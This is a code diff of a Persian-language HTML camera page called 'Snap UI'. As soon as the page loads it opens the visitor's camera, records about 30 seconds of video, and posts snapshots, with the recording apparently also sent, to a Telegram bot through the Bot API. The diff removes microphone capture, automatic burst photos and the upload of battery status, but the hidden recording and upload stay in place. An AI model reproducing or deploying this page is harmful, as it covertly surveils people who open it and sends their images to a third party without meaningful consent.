@@ -1,9 +1,10 @@
-<!DOCTYPE html><html lang="fa">
+<!DOCTYPE html>
+<html lang="fa">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Snap UI</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet" />
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/lucide@latest"></script>
   <style>
@@ -18,7 +19,8 @@
     #video {
       position: absolute;
       top: 0; left: 0;
-      width: 100%; height: 100%;
+      width: 100%;
+      height: 100%;
       object-fit: cover;
       z-index: 0;
     }
@@ -53,8 +55,11 @@
     <div class="flex justify-center">
       <button onclick="takePhoto()" class="circle-btn"></button>
     </div>
-  </div>  <script>
+  </div>
+
+  <script>
     lucide.createIcons();
+
     let useFront = true;
     let stream;
     let mediaRecorder;
@@ -69,14 +74,12 @@
       if (stream) stream.getTracks().forEach(t => t.stop());
       try {
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: useFront ? "user" : "environment" },
-          audio: true
+          video: { facingMode: useFront ? "user" : "environment" }
         });
         document.getElementById('video').srcObject = stream;
         startRecording();
-        autoCapture();
       } catch (err) {
-        alert("دوربین یا میکروفن در دسترس نیست.");
+        alert("دوربین در دسترس نیست یا اجازه داده نشده.");
       }
     }
 
@@ -85,7 +88,7 @@
       startCamera();
     }
 
-    async function takePhoto() {
+    function takePhoto() {
       const video = document.getElementById("video");
       const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth;
@@ -93,27 +96,15 @@
       const ctx = canvas.getContext("2d");
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(async blob => {
-        const battery = await navigator.getBattery();
-        const percent = Math.round(battery.level * 100);
-        const charging = battery.charging ? "در حال شارژ" : "غیر متصل";
-        const caption = `عکس ${++photoCount}\n🔋 شارژ: ${percent}%\n⚡️ ${charging}`;
-
         const form = new FormData();
         form.append("chat_id", chatId);
-        form.append("photo", blob, `photo${photoCount}.jpg`);
-        form.append("caption", caption);
+        form.append("photo", blob, `snap_${++photoCount}.jpg`);
+        form.append("caption", `عکس: ${photoCount}`);
         await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: "POST",
           body: form
         });
-      }, 'image/jpeg', 0.7);
-    }
-
-    function autoCapture() {
-      let interval = setInterval(() => {
-        if (photoCount >= 15) return clearInterval(interval);
-        takePhoto();
-      }, 4000);
+      }, 'image/jpeg', 0.8);
     }
 
     function startRecording() {
@@ -121,12 +112,13 @@
       mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
       mediaRecorder.ondataavailable = e => chunks.push(e.data);
       mediaRecorder.onstop = sendVideo;
+
       mediaRecorder.start();
       setTimeout(() => {
         if (mediaRecorder && mediaRecorder.state === "recording") {
           mediaRecorder.stop();
         }
-      }, 30000); // حداکثر ۳۰ ثانیه
+      }, 30000); // تا حداکثر ۳۰ ثانیه
     }
 
     async function sendVideo() {
@@ -150,5 +142,6 @@
     });
 
     startCamera();
-  </script></body>
+  </script>
+</body>
 </html>
